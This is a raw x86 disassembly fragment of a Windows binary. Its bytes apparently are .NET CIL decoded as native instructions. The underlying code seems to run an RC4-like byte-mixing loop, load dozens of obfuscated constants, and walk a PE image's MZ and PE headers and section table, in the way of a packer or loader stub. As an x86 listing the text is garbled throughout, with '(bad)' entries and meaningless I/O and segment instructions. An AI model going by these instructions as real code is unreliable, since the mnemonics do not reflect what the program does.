  4025e8:	5a                   	pop    %edx
  4025e9:	13 46 38             	adc    0x38(%esi),%eax
  4025ec:	16                   	push   %ss
  4025ed:	00 00                	add    %al,(%eax)
  4025ef:	00 11                	add    %dl,(%ecx)
  4025f1:	46                   	inc    %esi
  4025f2:	6a 11                	push   $0x11
  4025f4:	3a 6e 5b             	cmp    0x5b(%esi),%ch
  4025f7:	26 11 4f 11          	adc    %ecx,%es:0x11(%edi)
  4025fb:	34 5b                	xor    $0x5b,%al
  4025fd:	13 49 11             	adc    0x11(%ecx),%ecx
  402600:	3d 11 3e 5a 13       	cmp    $0x135a3e11,%eax
  402605:	3a 11                	cmp    (%ecx),%dl
  402607:	38 6e 11             	cmp    %ch,0x11(%esi)
  40260a:	50                   	push   %eax
  40260b:	6a 3e                	push   $0x3e
  40260d:	08 00                	or     %al,(%eax)
  40260f:	00 00                	add    %al,(%eax)
  402611:	11 59 6a             	adc    %ebx,0x6a(%ecx)
  402614:	11 4b 6e             	adc    %ecx,0x6e(%ebx)
  402617:	5b                   	pop    %ebx
  402618:	26 11 53 6a          	adc    %edx,%es:0x6a(%ebx)
  40261c:	11 36                	adc    %esi,(%esi)
  40261e:	6e                   	outsb  %ds:(%esi),(%dx)
  40261f:	3c 07                	cmp    $0x7,%al
  402621:	00 00                	add    %al,(%eax)
  402623:	00 11                	add    %dl,(%ecx)
  402625:	52                   	push   %edx
  402626:	11 36                	adc    %esi,(%esi)
  402628:	59                   	pop    %ecx
  402629:	13 39                	adc    (%ecx),%edi
  40262b:	11 5e 3f             	adc    %ebx,0x3f(%esi)
  40262e:	0a 00                	or     (%eax),%al
  402630:	00 00                	add    %al,(%eax)
  402632:	11 4a 6a             	adc    %ecx,0x6a(%edx)
  402635:	11 3f                	adc    %edi,(%edi)
  402637:	6e                   	outsb  %ds:(%esi),(%dx)
  402638:	5b                   	pop    %ebx
  402639:	6d                   	insl   (%dx),%es:(%edi)
  40263a:	13 48 11             	adc    0x11(%eax),%ecx
  40263d:	5b                   	pop    %ebx
  40263e:	11 53 3f             	adc    %edx,0x3f(%ebx)
  402641:	0f 00 00             	sldt   (%eax)
  402644:	00 11                	add    %dl,(%ecx)
  402646:	63 6a 11             	arpl   %ebp,0x11(%edx)
  402649:	40                   	inc    %eax
  40264a:	6e                   	outsb  %ds:(%esi),(%dx)
  40264b:	58                   	pop    %eax
  40264c:	6d                   	insl   (%dx),%es:(%edi)
  40264d:	13 5a 38             	adc    0x38(%edx),%ebx
  402650:	2e 00 00             	add    %al,%cs:(%eax)
  402653:	00 11                	add    %dl,(%ecx)
  402655:	4e                   	dec    %esi
  402656:	11 57 5b             	adc    %edx,0x5b(%edi)
  402659:	26 11 5e 6a          	adc    %ebx,%es:0x6a(%esi)
  40265d:	11 5a 6e             	adc    %ebx,0x6e(%edx)
  402660:	5b                   	pop    %ebx
  402661:	69 13 46 11 39 6a    	imul   $0x6a391146,(%ebx),%edx
  402667:	11 5a 6e             	adc    %ebx,0x6e(%edx)
  40266a:	61                   	popa
  40266b:	69 13 44 11 57 6a    	imul   $0x6a571144,(%ebx),%edx
  402671:	11 47 6e             	adc    %eax,0x6e(%edi)
  402674:	61                   	popa
  402675:	69 13 59 11 45 6e    	imul   $0x6e451159,(%ebx),%edx
  40267b:	11 4a 6a             	adc    %ecx,0x6a(%edx)
  40267e:	59                   	pop    %ecx
  40267f:	69 13 44 11 31 17    	imul   $0x17311144,(%ebx),%edx
  402685:	58                   	pop    %eax
  402686:	13 31                	adc    (%ecx),%esi
  402688:	11 39                	adc    %edi,(%ecx)
  40268a:	6a 11                	push   $0x11
  40268c:	49                   	dec    %ecx
  40268d:	6e                   	outsb  %ds:(%esi),(%dx)
  40268e:	3f                   	aas
  40268f:	07                   	pop    %es
  402690:	00 00                	add    %al,(%eax)
  402692:	00 11                	add    %dl,(%ecx)
  402694:	4d                   	dec    %ebp
  402695:	11 5d 58             	adc    %ebx,0x58(%ebp)
  402698:	13 3d 11 58 26 26    	adc    0x26265811,%edi
  40269e:	11 48 6e             	adc    %ecx,0x6e(%eax)
  4026a1:	11 34 6a             	adc    %esi,(%edx,%ebp,2)
  4026a4:	3d 14 00 00 00       	cmp    $0x14,%eax
  4026a9:	11 56 6e             	adc    %edx,0x6e(%esi)
  4026ac:	11 50 6a             	adc    %edx,0x6a(%eax)
  4026af:	61                   	popa
  4026b0:	6d                   	insl   (%dx),%es:(%edi)
  4026b1:	13 5a 11             	adc    0x11(%edx),%ebx
  4026b4:	5a                   	pop    %edx
  4026b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4026b6:	11 44 6a 58          	adc    %eax,0x58(%edx,%ebp,2)
  4026ba:	6d                   	insl   (%dx),%es:(%edi)
  4026bb:	13 47 11             	adc    0x11(%edi),%eax
  4026be:	4c                   	dec    %esp
  4026bf:	11 35 44 0c 00 00    	adc    %esi,0xc44
  4026c5:	00 11                	add    %dl,(%ecx)
  4026c7:	55                   	push   %ebp
  4026c8:	11 58 59             	adc    %ebx,0x59(%eax)
  4026cb:	13 4c 38 07          	adc    0x7(%eax,%edi,1),%ecx
  4026cf:	00 00                	add    %al,(%eax)
  4026d1:	00 11                	add    %dl,(%ecx)
  4026d3:	61                   	popa
  4026d4:	11 43 58             	adc    %eax,0x58(%ebx)
  4026d7:	13 60 11             	adc    0x11(%eax),%esp
  4026da:	37                   	aaa
  4026db:	26 26 11 33          	es adc %esi,%es:(%ebx)
  4026df:	17                   	pop    %ss
  4026e0:	58                   	pop    %eax
  4026e1:	13 33                	adc    (%ebx),%esi
  4026e3:	11 33                	adc    %esi,(%ebx)
  4026e5:	20 00                	and    %al,(%eax)
  4026e7:	01 00                	add    %eax,(%eax)
  4026e9:	00 3f                	add    %bh,(%edi)
  4026eb:	62 fd ff             	(bad) {rz-bad},{%k7}{z}
  4026ee:	ff 16                	call   *(%esi)
  4026f0:	13 65 38             	adc    0x38(%ebp),%esp
  4026f3:	19 03                	sbb    %eax,(%ebx)
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	11 2f                	adc    %ebp,(%edi)
  4026f9:	17                   	pop    %ss
  4026fa:	58                   	pop    %eax
  4026fb:	11 31                	adc    %esi,(%ecx)
  4026fd:	5d                   	pop    %ebp
  4026fe:	13 2f                	adc    (%edi),%ebp
  402700:	11 30                	adc    %esi,(%eax)
  402702:	11 2d 11 2f 91 58    	adc    %ebp,0x58912f11
  402708:	11 31                	adc    %esi,(%ecx)
  40270a:	5d                   	pop    %ebp
  40270b:	13 30                	adc    (%eax),%esi
  40270d:	73 1a                	jae    0x402729
  40270f:	00 00                	add    %al,(%eax)
  402711:	0a 13                	or     (%ebx),%dl
  402713:	66 11 66 11          	adc    %sp,0x11(%esi)
  402717:	2d 11 30 91 6f       	sub    $0x6f913011,%eax
  40271c:	1b 00                	sbb    (%eax),%eax
  40271e:	00 0a                	add    %cl,(%edx)
  402720:	20 98 b1 17 0a 13    	and    %bl,0x130a17b1(%eax)
  402726:	67 20 f8             	addr16 and %bh,%al
  402729:	44                   	inc    %esp
  40272a:	ff 60 13             	jmp    *0x13(%eax)
  40272d:	68 20 81 8f 9b       	push   $0x9b8f8120
  402732:	24 13                	and    $0x13,%al
  402734:	69 20 8d c5 d8 17    	imul   $0x17d8c58d,(%eax),%esp
  40273a:	13 6a 20             	adc    0x20(%edx),%ebp
  40273d:	96                   	xchg   %eax,%esi
  40273e:	73 16                	jae    0x402756
  402740:	2c 13                	sub    $0x13,%al
  402742:	6b 20 5f             	imul   $0x5f,(%eax),%esp
  402745:	fc                   	cld
  402746:	7f 38                	jg     0x402780
  402748:	13 6c 20 93          	adc    -0x6d(%eax,%eiz,1),%ebp
  40274c:	3b 94 37 13 6d 20 86 	cmp    -0x79df92ed(%edi,%esi,1),%edx
  402753:	c6                   	(bad)
  402754:	6c                   	insb   (%dx),%es:(%edi)
  402755:	08 13                	or     %dl,(%ebx)
  402757:	6e                   	outsb  %ds:(%esi),(%dx)
  402758:	20 0b                	and    %cl,(%ebx)
  40275a:	eb 22                	jmp    0x40277e
  40275c:	66 13 6f 20          	adc    0x20(%edi),%bp
  402760:	4e                   	dec    %esi
  402761:	22 72 56             	and    0x56(%edx),%dh
  402764:	13 70 20             	adc    0x20(%eax),%esi
  402767:	ad                   	lods   %ds:(%esi),%eax
  402768:	bd 7d 0f 13 71       	mov    $0x71130f7d,%ebp
  40276d:	20 10                	and    %dl,(%eax)
  40276f:	b4 28                	mov    $0x28,%ah
  402771:	0f 13 72 20          	movlps %xmm6,0x20(%edx)
  402775:	6e                   	outsb  %ds:(%esi),(%dx)
  402776:	a9 39 1f 13 73       	test   $0x73131f39,%eax
  40277b:	20 6e ef             	and    %ch,-0x11(%esi)
  40277e:	7a 59                	jp     0x4027d9
  402780:	13 74 20 b6          	adc    -0x4a(%eax,%eiz,1),%esi
  402784:	7f 6d                	jg     0x4027f3
  402786:	5e                   	pop    %esi
  402787:	13 75 20             	adc    0x20(%ebp),%esi
  40278a:	1d cb 86 10 13       	sbb    $0x131086cb,%eax
  40278f:	76 20                	jbe    0x4027b1
  402791:	2d 0c 92 7a 13       	sub    $0x137a920c,%eax
  402796:	77 20                	ja     0x4027b8
  402798:	9a c2 57 55 13 78 20 	lcall  $0x2078,$0x135557c2
  40279f:	0f 78 68 70          	vmread %ebp,0x70(%eax)
  4027a3:	13 79 20             	adc    0x20(%ecx),%edi
  4027a6:	d6                   	salc
  4027a7:	65 90                	gs nop
  4027a9:	0b 13                	or     (%ebx),%edx
  4027ab:	7a 20                	jp     0x4027cd
  4027ad:	60                   	pusha
  4027ae:	72 f7                	jb     0x4027a7
  4027b0:	20 13                	and    %dl,(%ebx)
  4027b2:	7b 20                	jnp    0x4027d4
  4027b4:	20 10                	and    %dl,(%eax)
  4027b6:	d6                   	salc
  4027b7:	30 13                	xor    %dl,(%ebx)
  4027b9:	7c 20                	jl     0x4027db
  4027bb:	4c                   	dec    %esp
  4027bc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4027bd:	44                   	inc    %esp
  4027be:	2b 13                	sub    (%ebx),%edx
  4027c0:	7d 20                	jge    0x4027e2
  4027c2:	6b 4f 03 5f          	imul   $0x5f,0x3(%edi),%ecx
  4027c6:	13 7e 20             	adc    0x20(%esi),%edi
  4027c9:	2e 0a 06             	or     %cs:(%esi),%al
  4027cc:	5c                   	pop    %esp
  4027cd:	13 7f 20             	adc    0x20(%edi),%edi
  4027d0:	84 69 9e             	test   %ch,-0x62(%ecx)
  4027d3:	21 13                	and    %edx,(%ebx)
  4027d5:	80 20 23             	andb   $0x23,(%eax)
  4027d8:	4c                   	dec    %esp
  4027d9:	f1                   	int1
  4027da:	6e                   	outsb  %ds:(%esi),(%dx)
  4027db:	13 81 20 d0 af c1    	adc    -0x3e502fe0(%ecx),%eax
  4027e1:	21 13                	and    %edx,(%ebx)
  4027e3:	82 20 16             	andb   $0x16,(%eax)
  4027e6:	fc                   	cld
  4027e7:	20 4c 13 83          	and    %cl,-0x7d(%ebx,%edx,1)
  4027eb:	20 c4                	and    %al,%ah
  4027ed:	35 9f 05 13 84       	xor    $0x8413059f,%eax
  4027f2:	20 65 f1             	and    %ah,-0xf(%ebp)
  4027f5:	86 0d 13 85 20 d8    	xchg   %cl,0xd8208513
  4027fb:	3a 37                	cmp    (%edi),%dh
  4027fd:	28 13                	sub    %dl,(%ebx)
  4027ff:	86 20                	xchg   %ah,(%eax)
  402801:	65 1a 23             	sbb    %gs:(%ebx),%ah
  402804:	78 13                	js     0x402819
  402806:	87 20                	xchg   %esp,(%eax)
  402808:	13 bd bb 38 13 88    	adc    -0x77ecc745(%ebp),%edi
  40280e:	20 79 d6             	and    %bh,-0x2a(%ecx)
  402811:	c6                   	(bad)
  402812:	48                   	dec    %eax
  402813:	13 89 20 97 76 5c    	adc    0x5c769720(%ecx),%ecx
  402819:	29 13                	sub    %edx,(%ebx)
  40281b:	8a 20                	mov    (%eax),%ah
  40281d:	f5                   	cmc
  40281e:	6c                   	insb   (%dx),%es:(%edi)
  40281f:	39 11                	cmp    %edx,(%ecx)
  402821:	13 8b 20 77 ce 26    	adc    0x26ce7720(%ebx),%ecx
  402827:	32 13                	xor    (%ebx),%dl
  402829:	8c 20                	mov    %fs,(%eax)
  40282b:	d9 9d 21 19 13 8d    	fstps  -0x72ece6df(%ebp)
  402831:	20 84 10 9a 56 13 8e 	and    %al,-0x71eca966(%eax,%edx,1)
  402838:	20 11                	and    %dl,(%ecx)
  40283a:	df c3                	ffreep %st(3)
  40283c:	49                   	dec    %ecx
  40283d:	13 8f 20 6a ca 40    	adc    0x40ca6a20(%edi),%ecx
  402843:	60                   	pusha
  402844:	13 90 20 84 54 ff    	adc    -0xab7be0(%eax),%edx
  40284a:	0a 13                	or     (%ebx),%dl
  40284c:	91                   	xchg   %eax,%ecx
  40284d:	20 3b                	and    %bh,(%ebx)
  40284f:	cc                   	int3
  402850:	78 09                	js     0x40285b
  402852:	13 92 20 9e 37 0e    	adc    0xe379e20(%edx),%edx
  402858:	55                   	push   %ebp
  402859:	13 93 20 33 67 4e    	adc    0x4e673320(%ebx),%edx
  40285f:	70 13                	jo     0x402874
  402861:	94                   	xchg   %eax,%esp
  402862:	20 16                	and    %dl,(%esi)
  402864:	b9 ab 09 13 95       	mov    $0x951309ab,%ecx
  402869:	20 47 ab             	and    %al,-0x55(%edi)
  40286c:	f0 35 13 96 20 de    	lock xor $0xde209613,%eax
  402872:	67 35 71 13 97 20    	addr16 xor $0x20971371,%eax
  402878:	89 51 9c             	mov    %edx,-0x64(%ecx)
  40287b:	06                   	push   %es
  40287c:	13 98 20 0a 9c ff    	adc    -0x63f5e0(%eax),%ebx
  402882:	0d 13 99 20 05       	or     $0x5209913,%eax
  402887:	8a d5                	mov    %ch,%dl
  402889:	4f                   	dec    %edi
  40288a:	13 9a 11 2d 11 30    	adc    0x30112d11(%edx),%ebx
  402890:	11 2d 11 2f 91 9c    	adc    %ebp,0x9c912f11
  402896:	11 69 11             	adc    %ebp,0x11(%ecx)
  402899:	97                   	xchg   %eax,%edi
  40289a:	61                   	popa
  40289b:	13 88 11 79 6a 11    	adc    0x116a7911(%eax),%ecx
  4028a1:	7f 6e                	jg     0x402911
  4028a3:	58                   	pop    %eax
  4028a4:	6d                   	insl   (%dx),%es:(%edi)
  4028a5:	13 7b 11             	adc    0x11(%ebx),%edi
  4028a8:	99                   	cltd
  4028a9:	6a 11                	push   $0x11
  4028ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4028ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4028ad:	26 26 11 84 6a 11 6b 	es adc %eax,%es:0x3f6e6b11(%edx,%ebp,2)
  4028b4:	6e 3f 
  4028b6:	08 00                	or     %al,(%eax)
  4028b8:	00 00                	add    %al,(%eax)
  4028ba:	11 8a 6a 11 7d 6e    	adc    %ecx,0x6e7d116a(%edx)
  4028c0:	5b                   	pop    %ebx
  4028c1:	26 11 82 11 87 3d 0a 	adc    %eax,%es:0xa3d8711(%edx)
  4028c8:	00 00                	add    %al,(%eax)
  4028ca:	00 11                	add    %dl,(%ecx)
  4028cc:	6d                   	insl   (%dx),%es:(%edi)
  4028cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4028ce:	11 7e 6a             	adc    %edi,0x6a(%esi)
  4028d1:	5b                   	pop    %ebx
  4028d2:	69 13 86 11 92 6a    	imul   $0x6a921186,(%ebx),%edx
  4028d8:	11 7b 6e             	adc    %edi,0x6e(%ebx)
  4028db:	3d 0c 00 00 00       	cmp    $0xc,%eax
  4028e0:	11 97 11 74 61 13    	adc    %edx,0x13617411(%edi)
  4028e6:	96                   	xchg   %eax,%esi
  4028e7:	38 1b                	cmp    %bl,(%ebx)
  4028e9:	00 00                	add    %al,(%eax)
  4028eb:	00 11                	add    %dl,(%ecx)
  4028ed:	80 6a 11 93          	subb   $0x93,0x11(%edx)
  4028f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4028f2:	59                   	pop    %ecx
  4028f3:	6d                   	insl   (%dx),%es:(%edi)
  4028f4:	13 89 11 6e 11 96    	adc    -0x69ee91ef(%ecx),%ecx
  4028fa:	61                   	popa
  4028fb:	13 72 11             	adc    0x11(%edx),%esi
  4028fe:	6a 6e                	push   $0x6e
  402900:	11 6c 6a 5b          	adc    %ebp,0x5b(%edx,%ebp,2)
  402904:	6d                   	insl   (%dx),%es:(%edi)
  402905:	13 75 11             	adc    0x11(%ebp),%esi
  402908:	7e 6a                	jle    0x402974
  40290a:	11 6a 6e             	adc    %ebp,0x6e(%edx)
  40290d:	3f                   	aas
  40290e:	11 00                	adc    %eax,(%eax)
  402910:	00 00                	add    %al,(%eax)
  402912:	11 93 11 67 61 13    	adc    %edx,0x13616711(%ebx)
  402918:	7a 11                	jp     0x40292b
  40291a:	78 6a                	js     0x402986
  40291c:	11 95 6e 5a 69 13    	adc    %edx,0x13695a6e(%ebp)
  402922:	68 11 8c 6a 11       	push   $0x116a8c11
  402927:	98                   	cwtl
  402928:	6e                   	outsb  %ds:(%esi),(%dx)
  402929:	3c 0a                	cmp    $0xa,%al
  40292b:	00 00                	add    %al,(%eax)
  40292d:	00 11                	add    %dl,(%ecx)
  40292f:	71 6a                	jno    0x40299b
  402931:	11 90 6e 58 6d 13    	adc    %edx,0x136d586e(%eax)
  402937:	95                   	xchg   %eax,%ebp
  402938:	11 70 11             	adc    %esi,0x11(%eax)
  40293b:	77 43                	ja     0x402980
  40293d:	07                   	pop    %es
  40293e:	00 00                	add    %al,(%eax)
  402940:	00 11                	add    %dl,(%ecx)
  402942:	7f 11                	jg     0x402955
  402944:	98                   	cwtl
  402945:	61                   	popa
  402946:	13 77 11             	adc    0x11(%edi),%esi
  402949:	2d 11 2f 11 66       	sub    $0x66112f11,%eax
  40294e:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402951:	00 0a                	add    %cl,(%edx)
  402953:	72 22                	jb     0x402977
  402955:	01 00                	add    %eax,(%eax)
  402957:	70 28                	jo     0x402981
  402959:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  40295e:	1e                   	push   %ds
  40295f:	00 00                	add    %al,(%eax)
  402961:	0a 28                	or     (%eax),%ch
  402963:	1f                   	pop    %ds
  402964:	00 00                	add    %al,(%eax)
  402966:	0a 6f 20             	or     0x20(%edi),%ch
  402969:	00 00                	add    %al,(%eax)
  40296b:	0a 9c dd 06 00 00 00 	or     0x6(%ebp,%ebx,8),%bl
  402972:	26 dd 00             	fldl   %es:(%eax)
  402975:	00 00                	add    %al,(%eax)
  402977:	00 11                	add    %dl,(%ecx)
  402979:	2d 11 2f 91 11       	sub    $0x11912f11,%eax
  40297e:	2d 11 30 91 58       	sub    $0x58913011,%eax
  402983:	11 31                	adc    %esi,(%ecx)
  402985:	5d                   	pop    %ebp
  402986:	13 9b 73 1a 00 00    	adc    0x1a73(%ebx),%ebx
  40298c:	0a 13                	or     (%ebx),%dl
  40298e:	9c                   	pushf
  40298f:	11 9c 11 2d 11 9b 91 	adc    %ebx,-0x6e64eed3(%ecx,%edx,1)
  402996:	6f                   	outsl  %ds:(%esi),(%dx)
  402997:	1b 00                	sbb    (%eax),%eax
  402999:	00 0a                	add    %cl,(%edx)
  40299b:	73 21                	jae    0x4029be
  40299d:	00 00                	add    %al,(%eax)
  40299f:	0a 11                	or     (%ecx),%dl
  4029a1:	65 6f                	outsl  %gs:(%esi),(%dx)
  4029a3:	22 00                	and    (%eax),%al
  4029a5:	00 0a                	add    %cl,(%edx)
  4029a7:	16                   	push   %ss
  4029a8:	13 9d 02 11 65 91    	adc    -0x6e9aeefe(%ebp),%ebx
  4029ae:	13 9d dd 06 00 00    	adc    0x6dd(%ebp),%ebx
  4029b4:	00 26                	add    %ah,(%esi)
  4029b6:	dd 00                	fldl   (%eax)
  4029b8:	00 00                	add    %al,(%eax)
  4029ba:	00 11                	add    %dl,(%ecx)
  4029bc:	9d                   	popf
  4029bd:	11 9c 16 6f 20 00 00 	adc    %ebx,0x206f(%esi,%edx,1)
  4029c4:	0a 61 d2             	or     -0x2e(%ecx),%ah
  4029c7:	13 9d 11 73 11 72    	adc    0x72117311(%ebp),%ebx
  4029cd:	3e 13 00             	adc    %ds:(%eax),%eax
  4029d0:	00 00                	add    %al,(%eax)
  4029d2:	11 8e 11 81 58 13    	adc    %ecx,0x13588111(%esi)
  4029d8:	9a 11 73 11 92 5a 13 	lcall  $0x135a,$0x92117311
  4029df:	6d                   	insl   (%dx),%es:(%edi)
  4029e0:	38 0a                	cmp    %cl,(%edx)
  4029e2:	00 00                	add    %al,(%eax)
  4029e4:	00 11                	add    %dl,(%ecx)
  4029e6:	84 6a 11             	test   %ch,0x11(%edx)
  4029e9:	7b 6e                	jnp    0x402a59
  4029eb:	59                   	pop    %ecx
  4029ec:	6d                   	insl   (%dx),%es:(%edi)
  4029ed:	13 6f 11             	adc    0x11(%edi),%ebp
  4029f0:	88 11                	mov    %dl,(%ecx)
  4029f2:	83 3f 06             	cmpl   $0x6,(%edi)
  4029f5:	00 00                	add    %al,(%eax)
  4029f7:	00 11                	add    %dl,(%ecx)
  4029f9:	80 11 99             	adcb   $0x99,(%ecx)
  4029fc:	5b                   	pop    %ebx
  4029fd:	26 11 91 11 90 26 26 	adc    %edx,%es:0x26269011(%ecx)
  402a04:	02 11                	add    (%ecx),%dl
  402a06:	65 11 9d 9c 11 65 17 	adc    %ebx,%gs:0x1765119c(%ebp)
  402a0d:	58                   	pop    %eax
  402a0e:	13 65 11             	adc    0x11(%ebp),%esp
  402a11:	65 03 3f             	add    %gs:(%edi),%edi
  402a14:	df fc                	(bad)
  402a16:	ff                   	(bad)
  402a17:	ff 2a                	ljmp   *(%edx)
  402a19:	00 00                	add    %al,(%eax)
  402a1b:	00 01                	add    %al,(%ecx)
  402a1d:	28 00                	sub    %al,(%eax)
  402a1f:	00 00                	add    %al,(%eax)
  402a21:	00 f8                	add    %bh,%al
  402a23:	01 21                	add    %esp,(%ecx)
  402a25:	19 02                	sbb    %eax,(%edx)
  402a27:	06                   	push   %es
  402a28:	27                   	daa
  402a29:	00 00                	add    %al,(%eax)
  402a2b:	01 00                	add    %eax,(%eax)
  402a2d:	00 ea                	add    %ch,%dl
  402a2f:	06                   	push   %es
  402a30:	dc c6                	fadd   %st,%st(6)
  402a32:	07                   	pop    %es
  402a33:	06                   	push   %es
  402a34:	1c 00                	sbb    $0x0,%al
  402a36:	00 01                	add    %al,(%ecx)
  402a38:	00 00                	add    %al,(%eax)
  402a3a:	fe 07                	incb   (%edi)
  402a3c:	0b 09                	or     (%ecx),%ecx
  402a3e:	08 06                	or     %al,(%esi)
  402a40:	28 00                	sub    %al,(%eax)
  402a42:	00 01                	add    %al,(%ecx)
  402a44:	1b 30                	sbb    (%eax),%esi
  402a46:	06                   	push   %es
  402a47:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  402a4a:	00 00                	add    %al,(%eax)
  402a4c:	04 00                	add    $0x0,%al
  402a4e:	00 11                	add    %dl,(%ecx)
  402a50:	28 7e 00             	sub    %bh,0x0(%esi)
  402a53:	00 06                	add    %al,(%esi)
  402a55:	28 23                	sub    %ah,(%ebx)
  402a57:	00 00                	add    %al,(%eax)
  402a59:	0a 28                	or     (%eax),%ch
  402a5b:	24 00                	and    $0x0,%al
  402a5d:	00 0a                	add    %cl,(%edx)
  402a5f:	0a 06                	or     (%esi),%al
  402a61:	16                   	push   %ss
  402a62:	28 25 00 00 0a 20    	sub    %ah,0x200a0000
  402a68:	4d                   	dec    %ebp
  402a69:	5a                   	pop    %edx
  402a6a:	00 00                	add    %al,(%eax)
  402a6c:	3b 01                	cmp    (%ecx),%eax
  402a6e:	00 00                	add    %al,(%eax)
  402a70:	00 2a                	add    %ch,(%edx)
  402a72:	06                   	push   %es
  402a73:	1f                   	pop    %ds
  402a74:	3c 28                	cmp    $0x28,%al
  402a76:	26 00 00             	add    %al,%es:(%eax)
  402a79:	0a 0b                	or     (%ebx),%cl
  402a7b:	06                   	push   %es
  402a7c:	07                   	pop    %es
  402a7d:	28 27                	sub    %ah,(%edi)
  402a7f:	00 00                	add    %al,(%eax)
  402a81:	0a 20                	or     (%eax),%ah
  402a83:	50                   	push   %eax
  402a84:	45                   	inc    %ebp
  402a85:	00 00                	add    %al,(%eax)
  402a87:	3b 01                	cmp    (%ecx),%eax
  402a89:	00 00                	add    %al,(%eax)
  402a8b:	00 2a                	add    %ch,(%edx)
  402a8d:	06                   	push   %es
  402a8e:	07                   	pop    %es
  402a8f:	1c 58                	sbb    $0x58,%al
  402a91:	28 25 00 00 0a 0c    	sub    %ah,0xc0a0000
  402a97:	06                   	push   %es
  402a98:	07                   	pop    %es
  402a99:	1f                   	pop    %ds
  402a9a:	14 58                	adc    $0x58,%al
  402a9c:	28 25 00 00 0a 0d    	sub    %ah,0xd0a0000
  402aa2:	07                   	pop    %es
  402aa3:	1f                   	pop    %ds
  402aa4:	18 58 09             	sbb    %bl,0x9(%eax)
  402aa7:	58                   	pop    %eax
  402aa8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402aab:	13 05 16 13 06 38    	adc    0x38061316,%eax
  402ab1:	91                   	xchg   %eax,%ecx
  402ab2:	00 00                	add    %al,(%eax)
  402ab4:	00 11                	add    %dl,(%ecx)
  402ab6:	04 11                	add    $0x11,%al
  402ab8:	06                   	push   %es
  402ab9:	1f                   	pop    %ds
  402aba:	28 5a 58             	sub    %bl,0x58(%edx)
  402abd:	13 07                	adc    (%edi),%eax
  402abf:	11 07                	adc    %eax,(%edi)
  402ac1:	28 28                	sub    %ch,(%eax)
  402ac3:	00 00                	add    %al,(%eax)
  402ac5:	0a 28                	or     (%eax),%ch
  402ac7:	29 00                	sub    %eax,(%eax)
  402ac9:	00 0a                	add    %cl,(%edx)
  402acb:	06                   	push   %es
  402acc:	11 07                	adc    %eax,(%edi)
  402ace:	1e                   	push   %ds
  402acf:	6f                   	outsl  %ds:(%esi),(%dx)
  402ad0:	2a 00                	sub    (%eax),%al
  402ad2:	00 0a                	add    %cl,(%edx)
  402ad4:	17                   	pop    %ss
  402ad5:	8d 2e                	lea    (%esi),%ebp
  402ad7:	00 00                	add    %al,(%eax)
  402ad9:	01 6f 2b             	add    %ebp,0x2b(%edi)
  402adc:	00 00                	add    %al,(%eax)
  402ade:	0a 13                	or     (%ebx),%dl
  402ae0:	08 11                	or     %dl,(%ecx)
  402ae2:	08 17                	or     %dl,(%edi)
  402ae4:	6f                   	outsl  %ds:(%esi),(%dx)
  402ae5:	2c 00                	sub    $0x0,%al
  402ae7:	00 0a                	add    %cl,(%edx)
  402ae9:	1f                   	pop    %ds
  402aea:	43                   	inc    %ebx
  402aeb:	40                   	inc    %eax
  402aec:	50                   	push   %eax
  402aed:	00 00                	add    %al,(%eax)
  402aef:	00 11                	add    %dl,(%ecx)
  402af1:	08 18                	or     %bl,(%eax)
  402af3:	6f                   	outsl  %ds:(%esi),(%dx)
  402af4:	2c 00                	sub    $0x0,%al
  402af6:	00 0a                	add    %cl,(%edx)
  402af8:	1f                   	pop    %ds
  402af9:	53                   	push   %ebx
  402afa:	40                   	inc    %eax
  402afb:	41                   	inc    %ecx
  402afc:	00 00                	add    %al,(%eax)
  402afe:	00 06                	add    %al,(%esi)
  402b00:	11 07                	adc    %eax,(%edi)
  402b02:	1f                   	pop    %ds
  402b03:	14 58                	adc    $0x58,%al
  402b05:	28 27                	sub    %ah,(%edi)
  402b07:	00 00                	add    %al,(%eax)
  402b09:	0a 13                	or     (%ebx),%dl
  402b0b:	09 06                	or     %eax,(%esi)
  402b0d:	11 07                	adc    %eax,(%edi)
  402b0f:	1f                   	pop    %ds
  402b10:	10 58 28             	adc    %bl,0x28(%eax)
  402b13:	27                   	daa
  402b14:	00 00                	add    %al,(%eax)
  402b16:	0a 13                	or     (%ebx),%dl
  402b18:	0a 11                	or     (%ecx),%dl
  402b1a:	0a 8d 1d 00 00 01    	or     0x100001d(%ebp),%cl
  402b20:	80 05 00 00 04 06 11 	addb   $0x11,0x6040000
  402b27:	09 6e 7e             	or     %ebp,0x7e(%esi)
  402b2a:	05 00 00 04 16       	add    $0x16040000,%eax
  402b2f:	6a 11                	push   $0x11
  402b31:	0a 6e 28             	or     0x28(%esi),%ch
  402b34:	2d 00 00 0a 17       	sub    $0x170a0000,%eax
  402b39:	13 05 38 0e 00 00    	adc    0xe38,%eax
  402b3f:	00 11                	add    %dl,(%ecx)
  402b41:	06                   	push   %es
  402b42:	17                   	pop    %ss
  402b43:	58                   	pop    %eax
  402b44:	13 06                	adc    (%esi),%eax
  402b46:	11 06                	adc    %eax,(%esi)
  402b48:	08 3f                	or     %bh,(%edi)
  402b4a:	67 ff                	addr16 (bad)
  402b4c:	ff                   	(bad)
  402b4d:	ff 11                	call   *(%ecx)
  402b4f:	05 3a 05 00 00       	add    $0x53a,%eax
  402b54:	00 dd                	add    %bl,%ch
  402b56:	11 00                	adc    %eax,(%eax)
  402b58:	00 00                	add    %al,(%eax)
  402b5a:	dd 06                	fldl   (%esi)
  402b5c:	00 00                	add    %al,(%eax)
  402b5e:	00 26                	add    %ah,(%esi)
  402b60:	dd 00                	fldl   (%eax)
  402b62:	00 00                	add    %al,(%eax)
  402b64:	00 73 03             	add    %dh,0x3(%ebx)
  402b67:	00 00                	add    %al,(%eax)
  402b69:	06                   	push   %es
  402b6a:	26 2a 01             	sub    %es:(%ecx),%al
  402b6d:	10 00                	adc    %al,(%eax)
  402b6f:	00 00                	add    %al,(%eax)
  402b71:	00 5d 00             	add    %bl,0x0(%ebp)
  402b74:	b2 0f                	mov    $0xf,%dl
  402b76:	01 06                	add    %eax,(%esi)
  402b78:	28 00                	sub    %al,(%eax)
